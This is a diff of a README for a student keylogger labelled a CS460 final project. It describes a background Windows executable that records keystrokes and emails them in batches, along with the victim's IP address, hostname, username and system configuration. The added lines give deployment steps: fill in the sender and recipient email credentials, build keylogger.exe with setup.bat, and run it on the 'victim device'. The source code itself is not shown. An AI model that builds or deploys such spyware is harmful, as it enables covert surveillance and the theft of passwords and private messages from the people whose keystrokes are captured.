@@ -2,22 +2,21 @@
 ###### by kchang33 and ywu100
 A Keylogger for CS460 Final Project
 
-Sends emails to a specified email address in batches of relatively constant length. These emails contain the key captures as well as the victim's IP address, hostname, username, and system configurations.
+Creates an windows executable file that runs in the background and tracks the keystrokes of the user. It then send the collected data to a specified email address in batches of relatively constant length along with the victim's IP address, hostname, username, and system configurations.
 
-(Tested on Windows 10, python version 2.7.13)
+(Tested on Windows 10, python version 2.7.13, pyinstaller version 3.2.1)
 
-Note: Python 3 users may experience issues when attempting to build the executable file
-
+NOTE: Python 3 users may experience issues when attempting to build the executable file
 ## Setting up:
-1. Get Packages needed to compile:
- - pynput 
- - pyinstaller (tested on version 3.2.1)
+#### 1. fill in the following in keylogger.py:
+* Destination email Address (destEmail): The email to send results to. The current email target is the source email. 
+* Source Email Information (srcEmail/srcPwd): This is the email that the result are sent from. 
+* Buffer Size (dataBufferSize): The number of characters that are collected before the email is sent.
 
-```
- pip install pynput
- pip install pyinstaller
-```
-2. Run **setup.bat**.
-3. Navigate to the newly created **dist** folder. If the setup was successful then **keylogger.exe** should be there.
+#### 2. Run **setup.bat**.
 
-The current email target is the sender. Its login information is located in the python script. The destination can be changed via the destEmail variable.
+This will install the required dependencies (_pyinstaller_ and _pynput_) and create an exe file. 
+
+#### 3. Navigate to the newly created **dist** folder. If the setup was successful then **keylogger.exe** should be there.
+
+#### 4. Run **keylogger.exe** on victim device.
